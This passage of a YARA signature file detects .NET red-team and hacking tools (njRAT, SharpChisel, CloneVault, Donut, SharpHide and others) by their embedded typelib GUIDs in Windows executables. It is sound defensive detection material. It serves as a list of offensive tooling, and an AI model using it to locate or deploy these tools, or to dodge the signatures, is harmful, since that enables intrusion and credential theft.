		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "2140d69e-fb15-50a2-ba85-b7c8293003fb"
		date = "2020-12-30"
		modified = "2025-08-15"
		reference = "https://github.com/mwsrc/njRAT"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3982-L4000"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "fc54c34e2d908e617781ffe8b4c5538304830cfec317ed2eab4157f72bbbf059"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "5a542c1b-2d36-4c31-b039-26a88d3967da" ascii wide
		$typelibguid1lo = "6b07082a-9256-42c3-999a-665e9de49f33" ascii wide
		$typelibguid2lo = "c0a9a70f-63e8-42ca-965d-73a1bc903e62" ascii wide
		$typelibguid3lo = "70bd11de-7da1-4a89-b459-8daacc930c20" ascii wide
		$typelibguid4lo = "fc790ee5-163a-40f9-a1e2-9863c290ff8b" ascii wide
		$typelibguid5lo = "cb3c28b2-2a4f-4114-941c-ce929fec94d3" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Manager : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "eef65d2c-ddbc-50c3-a6a0-e7032a55e92d"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/TheWover/Manager"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4002-L4016"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3783108ecfa26ee1a8d0ecfced9e601a41a159777d56a237ae82ad7860b45d5f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "dda73ee9-0f41-4c09-9cad-8215abd60b33" ascii wide
		$typelibguid1lo = "6a0f2422-d4d1-4b7e-84ad-56dc0fd2dfc5" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Neo_Confuserex : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d73117a6-4512-5545-a4f4-72d8cf708340"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/XenocodeRCE/neo-ConfuserEx"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4018-L4031"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c916b5443d5df0d58020aec6f3576e3d9cec50fa00b764d86ec7f3a49d0a8d93"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "e98490bb-63e5-492d-b14e-304de928f81a" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpallowedtoact : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "13b7f5e0-4d34-533d-a182-b3fe7c93ca43"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/pkb1s/SharpAllowedToAct"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4033-L4046"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "688c1e5944a96b3cc40deb3c3949da0391e9dbde8c78bcc05a1f48817ae7a0d4"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "dac5448a-4ad1-490a-846a-18e4e3e0cf9a" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Supersqlinjectionv1 : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "247bef0d-7873-51c7-97b8-1be6dfe7708d"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/shack2/SuperSQLInjectionV1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4048-L4061"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "cc4d7ac59d1092c357e0c1ac23eab1618a712cf846a65097c283ef62cfcb0c7d"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "d5688068-fc89-467d-913f-037a785caca7" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Adsearch : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "399ea06d-b36a-542b-bccc-8e8f935a35c6"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/tomcarver16/ADSearch"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4063-L4076"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d925d212b9474078cb3e8694048de22e56de94b33839647c187f3254149bf4ff"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "4da5f1b7-8936-4413-91f7-57d6e072b4a7" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Privilege_Escalation_Awesome_Scripts_Suite : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "fa218dfa-4b56-5a62-b149-63394bd0b604"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4078-L4091"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "1fdaa169213f31229973956cba064128ea6d256e339a8e3eb42cc9798ddf007f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "1928358e-a64b-493f-a741-ae8e3d029374" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_CVE_2020_1206_POC : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d70472f3-b19f-5097-bd70-99a7e7812ac4"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/ZecOps/CVE-2020-1206-POC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4093-L4108"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "26511510a1075457c8f133001fac18c8b44c997bd368b9336751bca714ec6ec3"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "3523ca04-a12d-4b40-8837-1a1d28ef96de" ascii wide
		$typelibguid1lo = "d3a2f24a-ddc6-4548-9b3d-470e70dbcaab" ascii wide
		$typelibguid2lo = "fb30ee05-4a35-45f7-9a0a-829aec7e47d9" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Dinvoke : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "cc260afb-20bc-4ec0-81fd-1b4b90b21a50"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/TheWover/DInvoke"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4110-L4123"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "4e7479d36ce78332d2224f16bc2f3059baa418f3035bca8b1ae1e5053dd4d3c3"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "b77fdab5-207c-4cdb-b1aa-348505c54229" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpchisel : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3b7e6703-ebe8-5a98-839f-7d0349ab483f"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/shantanu561993/SharpChisel"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4125-L4138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b2efa0f3757bf93a677d1faea14a71d2e63f45de99b7c9e55a951e6c401f6bd8"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "f5f21e2d-eb7e-4146-a7e1-371fd08d6762" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpscribbles : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "47125b76-9388-5372-8810-d198f623367a"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/V1V1/SharpScribbles"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4140-L4154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e4cff3fb3540fa1e189c71584889d07111ccc4a340c78011213819f206631446"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "aa61a166-31ef-429d-a971-ca654cd18c3b" ascii wide
		$typelibguid1lo = "0dc1b824-c6e7-4881-8788-35aecb34d227" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpreg : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d89b07b0-bb29-5c77-888b-322e439b4c82"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/jnqpblc/SharpReg"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4156-L4169"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d483e590310d69df4a0267ae3091067deb8698526dd8069862a944a6b1faed05"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "8ef25b00-ed6a-4464-bdec-17281a4aa52f" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Memevm : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "c98d84d5-4b0a-53df-b8d4-0b360930eb0c"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/TobitoFatitoRE/MemeVM"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4171-L4186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "88f4b9d0b3050ad676a54a58ea8f6a02fb07041db404c9d84f25fdda6ff3df4a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "ef18f7f2-1f03-481c-98f9-4a18a2f12c11" ascii wide
		$typelibguid1lo = "77b2c83b-ca34-4738-9384-c52f0121647c" ascii wide
		$typelibguid2lo = "14d5d12e-9a32-4516-904e-df3393626317" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpdir : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f64ed564-d198-59e8-9abe-b2814b95c85f"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/jnqpblc/SharpDir"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4188-L4201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "a98ee516931d08d82fb28749130be7d8007a8ac2935fd6007bae27820e216a92"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "c7a07532-12a3-4f6a-a342-161bb060b789" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Atyourservice : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3077dd0c-6936-5340-8da9-e8643de4d864"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/mitchmoser/AtYourService"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4203-L4216"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c15c466ff048af2818cf9b59794786ba6d11f70d7dee5ef5ee5f050a9b547790"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "bc72386f-8b4c-44de-99b7-b06a8de3ce3f" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Lockless : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f9b31f57-d721-5b6c-be63-b8309cba788a"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/GhostPack/LockLess"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4218-L4231"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "57e09a929cc90c399068fb00ddd00c462df34d285d51273aedf27220a0647a38"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "a91421cb-7909-4383-ba43-c2992bbbac22" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Easynet : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "8408a057-4910-5d7b-80bc-78df17c95bf7"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/TheWover/EasyNet"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4233-L4248"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "75f69a226391fc6da86c6995295addbefe0a7e1a9ff972f211174a845816061f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "3097d856-25c2-42c9-8d59-2cdad8e8ea12" ascii wide
		$typelibguid1lo = "ba33f716-91e0-4cf7-b9bd-b4d558f9a173" ascii wide
		$typelibguid2lo = "37d6dd3f-5457-4d8b-a2e1-c7b156b176e5" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpbyebear : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "4a7f2514-2519-5fd5-9d17-110a67f829e7"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/S3cur3Th1sSh1t/SharpByeBear"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4250-L4264"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f39d756b6e0b8f9037d862bdfa9b14fc2eeddf0eafad805892b8b02410f78c63"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "a6b84e35-2112-4df2-a31b-50fde4458c5e" ascii wide
		$typelibguid1lo = "3e82f538-6336-4fff-aeec-e774676205da" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharphide : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "928e00c1-549a-58f5-9e7e-982a4319691a"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/outflanknl/SharpHide"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4266-L4279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "62264aafeafe98ce23e7c03ce75be750ab95d77d3523c0748bdcb2f50d0c04cb"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "443d8cbf-899c-4c22-b4f6-b7ac202d4e37" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpsvc : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "cbc1d7d4-f3b4-5d02-84ae-621398cb7b51"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/jnqpblc/SharpSvc"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4281-L4294"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "cb91c4cd858a49f5cf437d3d1fb173afa7fe44442d41ea8533797007003c35d4"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "52856b03-5acd-45e0-828e-13ccb16942d1" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpcrasheventlog : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "85d31989-ad96-5005-a747-8a19a67fdd80"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/slyd0g/SharpCrashEventLog"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4296-L4309"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f53cfa44168a3ed81370ebb61153b6fab521801ffef33ace23aa8ed3376688eb"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "98cb495f-4d47-4722-b08f-cefab2282b18" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Dotnettojscript_Languagemodebreakout : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "8c8cf79f-8e69-5293-b27a-1f8593061627"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/FuzzySecurity/DotNetToJScript-LanguageModeBreakout"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4311-L4324"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "de83b8138f49fe6aced5d9ebe77104f780496630f35550fbf0244429a2cb4917"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "deadb33f-fa94-41b5-813d-e72d8677a0cf" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpermission : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d5027f51-f3ca-53cd-96d7-c355b5c2e6fa"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/mitchmoser/SharPermission"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4326-L4339"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "061a7ba9fb838b59a96e480356309af0c4b02d3ba3f2e83944c8dd98b739f6b6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "84d2b661-3267-49c8-9f51-8f72f21aea47" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Registrystrikesback : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "1577ed24-0e17-54f9-bc29-bb209acf9645"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/mdsecactivebreach/RegistryStrikesBack"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4341-L4354"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "1e2aa9ddf6cbf35cb636e35c18159468ec98eb2c30078c2a1a2a635d14599959"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "90ebd469-d780-4431-9bd8-014b00057665" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Clonevault : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3340a095-d926-5c85-b7ed-03151712538d"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/mdsecactivebreach/CloneVault"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4356-L4369"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "830802635e6fc9e364ec574bc9f04b062100c46bfbed7029f437c0392ce983bc"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "0a344f52-6780-4d10-9a4a-cb9439f9d3de" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Donut : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "564dfd0a-af9b-505f-a6f0-de2a5c5c63f3"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/TheWover/donut"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4371-L4387"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "aae1ca872f60ddc6919938e55d98d27bf88fb382e8d47c06cfc3d3e795ce9f2a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "98ca74c7-a074-434d-9772-75896e73ceaa" ascii wide
		$typelibguid1lo = "3c9a6b88-bed2-4ba8-964c-77ec29bf1846" ascii wide
		$typelibguid2lo = "4fcdf3a3-aeef-43ea-9297-0d3bde3bdad2" ascii wide
		$typelibguid3lo = "361c69f5-7885-4931-949a-b91eeab170e3" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
